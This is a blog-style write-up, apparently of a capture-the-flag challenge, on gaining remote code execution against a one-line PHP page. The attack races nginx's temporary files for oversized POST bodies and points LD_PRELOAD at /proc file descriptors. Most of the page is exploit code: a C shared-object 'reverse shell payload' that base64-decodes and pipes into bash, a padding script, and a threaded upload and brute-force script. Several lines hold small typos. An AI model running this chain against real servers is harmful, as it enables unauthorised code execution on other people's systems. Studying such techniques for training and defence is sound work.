---
layout: post
author: L3moon龙
tags: [PHP, Web Security]
---
# ez one line php

## Main idea 

Utilizing the feature that nginx will completely save the oversized post data as a temporary file, through conditional competition, the LD_PRELOADThe value of the environment variable is set to the uploaded temporary file, and then in system() when rce is triggered 

this is the index.php 

```php
<?php (empty($_GET["l3mon"])) ? highlight_file(__FILE__) : putenv($_GET["env"]) && system('echo uwu');?>
```

## Testing temporary file location and content :

we first need to set up the environment, 
- change the configuration of nginx by set `client_body_in_file_onlyOpen` so that temporarily saved files are not deleted: 

our nginx configuration file is `/etc/nginx/nginx.conf` 

```nginx
http {
    client_body_in_file_only on;
    client_body_temp_path /tmp/nginx_client_temp;
    client_body_buffer_size 128k;
    client_max_body_size 128k;
    proxy_temp_path /tmp/nginx_proxy_temp;
    proxy_buffer_size 128k;
    proxy_buffers 4 128k;
    proxy_busy_buffers_size 128k;
    proxy_max_temp_file_size 0;
    fastcgi_temp_path /tmp/nginx_fastcgi_temp;
    fastcgi_buffer_size 128k;
    fastcgi_buffers 4 128k;
    fastcgi_busy_buffers_size 128k;
    fastcgi_max_temp_file_size 0;
    uwsgi_temp_path /tmp/nginx_uwsgi_temp;
    uwsgi_buffer_size 128k;
    uwsgi_buffers 4 128k;
    uwsgi_busy_buffers_size 128k;
    uwsgi_max_temp_file_size 0;
    scgi_temp_path /tmp/nginx_scgi_temp;
    scgi_buffer_size 128k;
    scgi_buffers 4 128k;
    scgi_busy_buffers_size 128k;
    scgi_max_temp_file_size 0;
}
```

our `/etc/nginx/sites-enabled/default`

```nginx
location ~ \.php$ { 
        include snippets/fastcgi-php.conf; 
        client_body_in_file_only on; 
        # With php-fpm (or other unix sockets): 
#       fastcgi_pass unix:/run/php/php7.3-fpm.sock; 
        # With php-cgi (or other tcp sockets): 
        fastcgi_pass 127.0.0.1:9000; 
} 
```
now let's install inotifywait, monitor /var/lib/nginx ： 
    
    ```bash
    apt install inotify-tools
    ```
then we initiate a request to the server, and we can see that the temporary file is created in /var/lib/nginx ： 

```bash
root@kali:~# inotifywait -m /var/lib/nginx -e create
Setting up watches.  Beware: since -r was given, this may take a while!
Watches established.
```
we send a big request to the server, and we can see that the temporary file is created ： 

```python 
mport  requests 
URL =  f'http://ant.com:8888/index.php' 
requests.post(URL, data= 16 * 1024 * 'A' ) 
```

after sending the request, we can see that the temporary file is created ： 

```bash
root@kali:~# cat /var/lib/nginx/body/0000000001
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ....
```
that's interesting, we can see that the temporary file is created in /var/lib/nginx/body/0000000001, and the content is the same as the data we sent. 

## RCE :

### structuring the payload ： 
```c
    // reverse shell payload l3m
# define  _GNU_SOURCE 

# include  <stdlib.h> 

__attribute__ ((__constructor__))  void  preload  ( void ) 
{ 
    system( "echo payload64 | base64 -d | bash" ); 
} 
```

we compile it 
    
```bash
gcc -fPIC reverseshell.c -shared -o reverseshell.so 
```

Dirty data can be spliced ​​directly at the end of the .so file: 

```python
with  open( "reverseshell.so" , "br" )  as  f: 
  c = f.read() 
  c = c +  16 * 1024 * b'A' 
with  open( "reverseshell_dirty.so" , "bw" )  as  f: 
  f.write(c) 
  ```

## The whole exploit chain :
    
```python
import  sys, threading, requests 

# exploit PHP local file inclusion (LFI) via nginx's client body buffering assistance 
URL =  'http://target:port/index.php' 
done =  False 
# upload a big client body to force nginx to create a /var/lib/nginx/body/$X 
def   uploader  ()  : 
    print( '[+] starting uploader' ) 
    while  not  done: 
        requests.get(URL, data=open("rev.so" , "br" ).read()) 
for  _  in  range( 16 ): 
    t = threading.Thread(target=uploader) 
    t.start() 

# brute force nginx's fds and pids 
def  bruter () : 
    for  pid  in  range(4194304): 
        print( f'[+] brute loop restarted:  {pid} ' ) 
        for  fd  in  range( 4 ,  32 ): 
            f =  f'/proc/ {pid} /fd/ {fd} ' 
            r  = requests.get(URL, params={ 
                'env' :  f"LD_PRELOAD= {f} " , 
            }) 

a = threading.Thread(target=bruter) 
a.start() 

```

Success Rate : 60 %

> with love by l3mon